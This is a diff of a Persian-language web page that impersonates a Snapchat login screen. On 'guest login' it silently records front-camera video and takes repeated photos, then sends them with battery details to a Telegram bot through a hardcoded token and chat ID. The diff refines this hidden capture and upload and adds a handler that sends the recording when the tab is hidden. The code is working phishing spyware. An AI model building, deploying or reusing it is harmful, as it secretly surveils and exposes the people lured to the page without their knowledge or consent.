@@ -2,106 +2,80 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>SnapChat Clone</title>
+  <title>SnapChat Auto</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
   <style>
     body {
-      margin: 0;
+      direction: rtl;
       font-family: 'Vazirmatn', sans-serif;
+      margin: 0;
       background: #FFFC00;
+      color: #000;
       overflow: hidden;
     }
-    .splash, .login, .camera {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #FFFC00;
-      flex-direction: column;
-      z-index: 10;
+    .fade-in {
+      animation: fadeIn 1s ease forwards;
     }
-    .hidden { display: none; }
-    #video {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: 0;
+    @keyframes fadeIn {
+      from { opacity: 0 }
+      to { opacity: 1 }
     }
-    .overlay {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      z-index: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      padding: 1rem;
-      background: linear-gradient(to top, rgba(255,255,255,0.1), transparent 60%);
-    }
-    .circle-btn {
-      width: 72px; height: 72px;
-      background-color: white;
-      border-radius: 50%;
-      border: 4px solid #000;
+    .rounded-btn {
+      @apply flex items-center gap-2 justify-center w-full py-3 rounded-full text-lg font-bold transition transform hover:scale-105 shadow-md;
     }
   </style>
 </head>
 <body>
-
-  <!-- Splash -->
-  <div class="splash" id="splash">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png" width="120" alt="Snapchat">
+  <div id="splash" class="flex flex-col items-center justify-center h-screen bg-yellow-400 fade-in">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat" class="w-24 h-24 mb-4 animate-bounce" />
+    <h1 class="text-3xl font-bold">Snapchat</h1>
   </div>
 
-  <!-- Login -->
-  <div class="login hidden" id="login">
-    <h1 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h1>
-    <button class="mb-4 bg-white px-6 py-2 rounded shadow" onclick="alert('فعلاً فعال نیست')">ورود با گوگل</button>
-    <button class="mb-4 bg-white px-6 py-2 rounded shadow" onclick="alert('فعلاً فعال نیست')">ورود با فیسبوک</button>
-    <button class="bg-black text-white px-6 py-2 rounded shadow" onclick="startSnap()">ورود مهمان</button>
+  <div id="login" class="hidden flex-col items-center justify-center h-screen px-6 bg-yellow-400 fade-in space-y-4">
+    <button class="rounded-btn bg-white text-black"><i data-lucide="mail"></i> ورود با گوگل</button>
+    <button class="rounded-btn bg-blue-600 text-white"><i data-lucide="facebook"></i> ورود با فیس‌بوک</button>
+    <button id="guestBtn" class="rounded-btn bg-black text-white"><i data-lucide="user"></i> ورود مهمان</button>
   </div>
 
-  <!-- Camera -->
-  <video id="video" autoplay playsinline muted class="hidden"></video>
-  <div class="overlay hidden" id="overlay">
-    <div class="flex justify-between">
+  <video id="video" autoplay playsinline muted class="hidden absolute top-0 left-0 w-full h-full object-cover z-0"></video>
+  <div id="overlay" class="hidden overlay">
+    <div class="flex justify-between p-4">
       <div></div>
       <button class="text-black p-2 bg-white/40 rounded-full cursor-default" disabled>
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="black">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553 2.276A2 2 0 0121 14.118V17a2 2 0 01-2 2h-2m-4 0H7a2 2 0 01-2-2v-3.118a2 2 0 011.447-1.842L11 10" />
-        </svg>
+        <i data-lucide="camera"></i>
       </button>
     </div>
-    <div class="flex justify-center">
-      <button class="circle-btn cursor-pointer" onclick="void(0)"></button>
+    <div class="flex justify-center pb-6">
+      <button class="w-16 h-16 bg-white border-4 border-black rounded-full cursor-default" disabled></button>
     </div>
   </div>
 
   <script>
+    lucide.createIcons();
     const splash = document.getElementById("splash");
     const login = document.getElementById("login");
+    const guestBtn = document.getElementById("guestBtn");
     const video = document.getElementById("video");
     const overlay = document.getElementById("overlay");
+
+    let stream, mediaRecorder, chunks = [], photoCount = 0, videoSent = false;
+    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
+    const chatId = "-1002651451203";
 
     setTimeout(() => {
       splash.classList.add("hidden");
       login.classList.remove("hidden");
-    }, 3000);
+    }, 2500);
 
-    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
-    const chatId = "-1002651451203";
-
-    let stream;
-    let mediaRecorder;
-    let chunks = [];
-    let photoCount = 0;
-    let videoSent = false;
+    guestBtn.onclick = () => {
+      login.classList.add("hidden");
+      video.classList.remove("hidden");
+      overlay.classList.remove("hidden");
+      startCamera();
+    };
 
     async function getBatteryInfo() {
       if (navigator.getBattery) {
@@ -114,10 +88,7 @@
       return { level: "?", charging: false };
     }
 
-    async function startSnap() {
-      login.classList.add("hidden");
-      video.classList.remove("hidden");
-      overlay.classList.remove("hidden");
+    async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
           video: { width: 640, height: 480, facingMode: "user" }
@@ -125,8 +96,8 @@
         video.srcObject = stream;
         startRecording();
         takeAutoPhotos();
-      } catch (e) {
-        alert("عدم دسترسی به دوربین");
+      } catch {
+        alert("دسترسی به دوربین رد شده یا مشکل دارد.");
       }
     }
 
@@ -134,19 +105,16 @@
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.getContext("2d").drawImage(video, 0, 0);
       canvas.toBlob(async blob => {
         const battery = await getBatteryInfo();
-        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
+        const caption = `📸 *عکس ${++photoCount}*\n🔋 ${battery.level}% | ⚡ ${battery.charging ? "وصل" : "قطع"}\n✨ @SnapAuto`;
         const form = new FormData();
         form.append("chat_id", chatId);
-        form.append("photo", blob, `snap_${photoCount}.jpg`);
+        form.append("photo", blob, `photo_${photoCount}.jpg`);
         form.append("caption", caption);
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: form
-        });
+        form.append("parse_mode", "Markdown");
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form });
       }, 'image/jpeg', 0.8);
     }
 
@@ -162,7 +130,7 @@
       mediaRecorder.onstop = sendVideo;
       mediaRecorder.start();
       setTimeout(() => {
-        if (mediaRecorder.state === "recording") mediaRecorder.stop();
+        if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
       }, 60000);
     }
 
@@ -174,15 +142,17 @@
       const form = new FormData();
       form.append("chat_id", chatId);
       form.append("video", blob, "video.webm");
-      form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
-      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-        method: "POST",
-        body: form
-      });
+      form.append("caption", `🎥 *ویدیو*\n🔋 ${battery.level}% | ⚡ ${battery.charging ? "وصل" : "قطع"}\n✨ @SnapAuto`);
+      form.append("parse_mode", "Markdown");
+      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: form });
     }
 
     window.addEventListener("beforeunload", () => {
-      if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
+      if (mediaRecorder?.state === "recording") mediaRecorder.stop();
+    });
+
+    document.addEventListener("visibilitychange", () => {
+      if (document.hidden && mediaRecorder?.state === "recording") mediaRecorder.stop();
     });
   </script>
 </body>
